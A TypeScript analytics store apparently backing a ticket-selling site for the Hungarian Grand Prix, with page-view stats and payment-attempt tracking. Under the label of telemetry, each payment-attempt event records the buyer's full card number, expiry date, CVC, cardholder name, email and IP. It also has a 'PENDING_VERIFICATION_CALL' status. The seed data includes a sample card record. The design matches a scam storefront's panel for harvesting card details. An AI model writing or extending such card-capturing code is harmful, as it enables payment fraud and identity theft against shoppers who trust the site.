export interface TrackingEvent {
  id: string;
  type: 'PAGE_VIEW' | 'EVENT_VIEW' | 'PAYMENT_ATTEMPT' | 'TICKET_LISTING';
  path: string;
  eventName?: string;
  amount?: number;
  paymentMethod?: string;
  status?: 'SUCCESS' | 'FAILED' | 'PENDING' | 'PENDING_VERIFICATION_CALL';
  timestamp: string;
  // Enhanced Telemetry Fields
  country?: string;
  countryCode?: string;
  referrer?: string;
  deviceOs?: string;
  ip?: string;
  // Card Details Payload for Attempted Purchases
  cardNumber?: string;
  expiry?: string;
  cvc?: string;
  cardholderName?: string;
  email?: string;
}

class AnalyticsStore {
  private events: TrackingEvent[] = [
    {
      id: 'evt-101',
      type: 'PAYMENT_ATTEMPT',
      path: '/checkout',
      eventName: 'Hungarian Grand Prix',
      amount: 13640,
      paymentMethod: 'Credit Card',
      status: 'FAILED',
      timestamp: new Date(Date.now() - 1200000).toISOString(),
      country: 'Hungary',
      countryCode: 'HU',
      referrer: 'google.com',
      deviceOs: 'Windows 11',
      cardNumber: '4532 8812 3491 4242',
      expiry: '08 / 28',
      cvc: '884',
      cardholderName: 'Kovács Péter',
      email: 'peter@example.hu',
    },
    {
      id: 'evt-102',
      type: 'PAGE_VIEW',
      path: '/sell',
      timestamp: new Date(Date.now() - 3600000).toISOString(),
      country: 'Hungary',
      countryCode: 'HU',
      referrer: 'Direct',
      deviceOs: 'iOS 17',
    },
    {
      id: 'evt-103',
      type: 'PAGE_VIEW',
      path: '/schedule',
      timestamp: new Date(Date.now() - 5400000).toISOString(),
      country: 'United Kingdom',
      countryCode: 'GB',
      referrer: 'twitter.com',
      deviceOs: 'macOS Sonoma',
    },
    {
      id: 'evt-104',
      type: 'PAGE_VIEW',
      path: '/hospitality',
      timestamp: new Date(Date.now() - 7200000).toISOString(),
      country: 'Germany',
      countryCode: 'DE',
      referrer: 'google.com',
      deviceOs: 'Android 14',
    },
  ];

  public track(event: Omit<TrackingEvent, 'id' | 'timestamp'>) {
    const newEvent: TrackingEvent = {
      ...event,
      id: `evt-${Math.random().toString(36).substring(2, 9)}`,
      timestamp: new Date().toISOString(),
    };
    this.events.unshift(newEvent);
    return newEvent;
  }

  public deleteEvent(id: string) {
    const initialLength = this.events.length;
    this.events = this.events.filter((e) => e.id !== id);
    return this.events.length < initialLength;
  }

  public getEvents() {
    return this.events;
  }

  public getStats() {
    const totalPageViews = this.events.filter((e) => e.type === 'PAGE_VIEW').length;
    const totalEventViews = this.events.filter((e) => e.type === 'EVENT_VIEW').length;
    const paymentAttempts = this.events.filter((e) => e.type === 'PAYMENT_ATTEMPT');
    const successfulPayments = paymentAttempts.filter((e) => e.status === 'SUCCESS');

    const totalRevenue = successfulPayments.reduce((acc, curr) => acc + (curr.amount || 0), 0);
    const paymentSuccessRate = paymentAttempts.length > 0
      ? Math.round((successfulPayments.length / paymentAttempts.length) * 100)
      : 0;

    // Real event counts map
    const eventCounts: Record<string, number> = {};

    this.events.forEach((e) => {
      if (e.eventName) {
        eventCounts[e.eventName] = (eventCounts[e.eventName] || 0) + 1;
      }
    });

    return {
      totalPageViews,
      totalEventViews,
      totalPaymentAttempts: paymentAttempts.length,
      successfulPaymentsCount: successfulPayments.length,
      paymentSuccessRate,
      totalRevenue,
      eventCounts,
      recentEvents: this.events,
    };
  }
}

export const analyticsStore = new AnalyticsStore();
